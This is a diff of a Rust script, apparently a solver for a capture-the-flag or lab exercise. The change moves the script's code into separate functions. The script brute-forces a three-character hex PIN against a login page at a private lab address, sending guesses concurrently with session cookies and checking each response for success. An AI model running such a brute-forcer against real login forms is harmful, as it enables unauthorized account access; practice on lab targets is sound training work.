@@ -12,12 +12,9 @@ struct BruteResult {
     success: bool,
 }
 
-#[tokio::main]
-async fn main() -> Result<(), reqwest::Error> {
+fn get_combinations(n: i32) -> Vec<String> {
     let characters: Vec<String> = "0123456789ABCDEF".chars().map(|x| x.into()).collect();
-    let n = 3;
-
-    let combinations: Vec<_> = (2..n).fold(
+    (2..n).fold(
         characters
             .iter()
             .cartesian_product(characters.iter())
@@ -29,22 +26,14 @@ async fn main() -> Result<(), reqwest::Error> {
                 .map(|(a, b)| a.to_owned() + &*b.to_owned())
                 .collect()
         },
-    );
-    // println!("{:?}", combinations);
+    )
+}
 
-    let client: Client = Client::builder().cookie_store(true).build().unwrap();
-    let ip: &str = "10.10.237.9";
-
-    let url: String = format!("http://{ip}:8000/pin.php", ip = ip);
-
-    client.get(&*url).send().await?;
-
-    // println!("{:?}", client.get(&*url).send().await?.cookies().next());
-
+async fn brute_force(client: &Client, combinations: &Vec<String>, ip: &str) -> Result<Option<String>, Error>{
     let mut brute_results = stream::iter(combinations)
-        .map(|combination: String| {
+        .map(|combination: &String| {
             let client: &Client = &client;
-            let url = format!("http://{ip}:8000/login.php", ip = ip);
+            let url: String = format!("http://{ip}:8000/login.php", ip = ip);
             async move {
                 let mut params: HashMap<&str, &str> = HashMap::new();
                 params.insert("pin", &*combination);
@@ -53,11 +42,11 @@ async fn main() -> Result<(), reqwest::Error> {
                 let soup = Soup::new(&response_text);
                 match soup.tag("h1").find() {
                     Some(_) => Ok::<BruteResult, Error>(BruteResult {
-                        combination,
+                        combination: combination.clone(),
                         success: false,
                     }),
                     None => Ok::<BruteResult, Error>(BruteResult {
-                        combination,
+                        combination: combination.clone(),
                         success: true,
                     }),
                 }
@@ -88,13 +77,33 @@ async fn main() -> Result<(), reqwest::Error> {
         }
     }
 
+    Ok(final_combination)
+}
+
+#[tokio::main]
+async fn main() -> Result<(), reqwest::Error> {
+
+    let combinations: Vec<_> = get_combinations(3);
+    // println!("{:?}", combinations);
+
+    let client: Client = Client::builder().cookie_store(true).build().unwrap();
+    let ip: &str = "10.10.237.9";
+
+    let url: String = format!("http://{ip}:8000/pin.php", ip = ip);
+
+    client.get(&*url).send().await?;
+
+    // println!("{:?}", client.get(&*url).send().await?.cookies().next());
+
+    let final_combination: Option<String> = brute_force(&client, &combinations, ip).await.unwrap();
+
     if final_combination.is_none() {
         return Ok(());
     }
 
-    let combination = final_combination.unwrap();
+    let combination: String = final_combination.unwrap();
 
-    let url = format!("http://{ip}:8000/login.php", ip = ip);
+    let url: String = format!("http://{ip}:8000/login.php", ip = ip);
     let mut params: HashMap<&str, &str> = HashMap::new();
     params.insert("pin", &*combination);
     let resp: Response = client.post(&*url).form(&params).send().await?;
